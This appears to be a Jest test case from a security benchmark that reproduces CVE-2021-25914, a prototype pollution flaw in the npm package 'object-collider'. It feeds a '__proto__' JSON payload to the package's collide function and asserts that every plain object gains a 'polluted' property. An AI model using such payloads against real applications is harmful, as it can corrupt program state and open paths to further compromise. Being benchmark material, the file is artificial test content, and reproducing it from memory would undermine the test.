//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25914

test("prototype pollution in object-collider", () => {
  var { collide } = require("object-collider");
  const payload = JSON.parse(process.env.SECBENCH_PAYLOAD || process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');
  obj = {};

  expect({}.polluted).toBe(undefined);

  collide(obj, payload);
  expect({}.polluted).toBe("yes");
});
